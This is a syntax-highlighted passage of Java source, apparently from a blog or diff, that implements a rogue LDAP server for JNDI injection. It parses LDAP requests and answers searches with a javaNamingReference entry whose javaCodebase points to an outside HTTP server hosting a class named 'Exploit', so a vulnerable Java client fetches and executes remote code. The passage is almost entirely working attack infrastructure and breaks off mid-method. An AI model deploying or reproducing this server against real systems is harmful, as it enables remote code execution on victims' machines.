+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>read</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=k>break</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>totalRead</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>read</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 返回完整报文（包含 tag + length + value）</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>tag</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>writeBerLength</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 读取 BER 编码的长度
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>readBerLength</span><span class=p>(</span><span class=n>InputStream</span><span class=w> </span><span class=n>in</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>firstByte</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>in</span><span class=p>.</span><span class=na>read</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>firstByte</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0x80</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>firstByte</span><span class=p>;</span><span class=w> </span><span class=c1>// 短格式</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>numBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>firstByte</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0x7F</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>numBytes</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>length</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>8</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>in</span><span class=p>.</span><span class=na>read</span><span class=p>()</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>length</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 从 LDAP 请求中解析 messageID
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>parseMessageId</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>message</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// LDAPMessage ::= SEQUENCE { messageID INTEGER, ... }</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// SEQUENCE tag=0x30, 然后是长度, 然后是 INTEGER tag=0x02, 长度, 值</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 跳过 SEQUENCE tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0x30</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>offset</span><span class=o>++</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 跳过 SEQUENCE length</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0x80</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>offset</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=p>(</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0x7F</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>offset</span><span class=o>++</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 读取 INTEGER</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0x02</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>offset</span><span class=o>++</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>intLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>offset</span><span class=o>++</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>intLen</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>8</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>++]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 从 LDAP 请求中解析操作类型
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 返回 APPLICATION tag 字节（如 0x60=BindRequest, 0x63=SearchRequest）
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>parseOperationType</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>message</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 跳过 SEQUENCE tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0x30</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>offset</span><span class=o>++</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 跳过 SEQUENCE length</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0x80</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>offset</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=p>(</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0x7F</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>offset</span><span class=o>++</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 跳过 messageID (INTEGER)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0x02</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>offset</span><span class=o>++</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>intLen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>offset</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>intLen</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 返回操作类型 tag</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>message</span><span class=o>[</span><span class=n>offset</span><span class=o>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>0xFF</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// ========== 构造 LDAP 响应 ==========</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 构造 Bind 成功响应
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * BindResponse ::= [APPLICATION 1] SEQUENCE { resultCode ENUMERATED, ... }
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>buildBindResponse</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>messageId</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// messageID</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeInteger</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// BindResponse [APPLICATION 1] ::= SEQUENCE { resultCode, matchedDN, diagnosticMessage }</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>bindResp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeEnumerated</span><span class=p>(</span><span class=n>bindResp</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w> </span><span class=c1>// resultCode = success</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeOctetString</span><span class=p>(</span><span class=n>bindResp</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>// matchedDN</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeOctetString</span><span class=p>(</span><span class=n>bindResp</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>// diagnosticMessage</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeApplication</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>bindResp</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 包装成 LDAPMessage SEQUENCE</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeSequence</span><span class=p>(</span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 构造 SearchResultEntry 响应
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * SearchResultEntry ::= [APPLICATION 4] SEQUENCE { objectName, attributes }
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>buildSearchEntryResponse</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>messageId</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// messageID</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeInteger</span><span class=p>(</span><span class=n>baos</span><span class=p>,</span><span class=w> </span><span class=n>messageId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 构造 SearchResultEntry 内容</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>entryContent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// objectName</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeOctetString</span><span class=p>(</span><span class=n>entryContent</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Exploit&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// attributes (PartialAttributeList)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>attrs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeAttribute</span><span class=p>(</span><span class=n>attrs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;objectClass&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;javaNamingReference&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeAttribute</span><span class=p>(</span><span class=n>attrs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;javaClassName&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Exploit&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeAttribute</span><span class=p>(</span><span class=n>attrs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;javaCodebase&#34;</span><span class=p>,</span><span class=w> </span><span class=n>HTTP_SERVER</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeAttribute</span><span class=p>(</span><span class=n>attrs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;javaFactory&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Exploit&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BerEncoder</span><span class=p>.</span><span class=na>encodeSequence</span><span class=p>(</span><span class=n>entryContent</span><span class=p>,</span><span class=w> </span><span class=n>attrs</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
